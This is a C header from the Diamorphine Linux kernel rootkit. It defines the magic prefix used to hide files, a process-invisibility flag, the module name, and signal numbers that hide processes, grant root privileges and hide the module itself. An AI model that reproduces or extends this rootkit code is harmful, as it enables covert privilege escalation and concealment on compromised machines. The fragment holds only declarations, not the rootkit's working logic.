struct linux_dirent {
        unsigned long   d_ino;
        unsigned long   d_off;
        unsigned short  d_reclen;
        char            d_name[1];
};

#define START_MEM	PAGE_OFFSET
#define END_MEM		ULONG_MAX

#define MAGIC_PREFIX "diamorphine_secret"

#define PF_INVISIBLE 0x10000000

#define MODULE_NAME "diamorphine"

enum {
	SIGINVIS = 31,
	SIGSUPER = 64,
	SIGMODINVIS = 63,
};
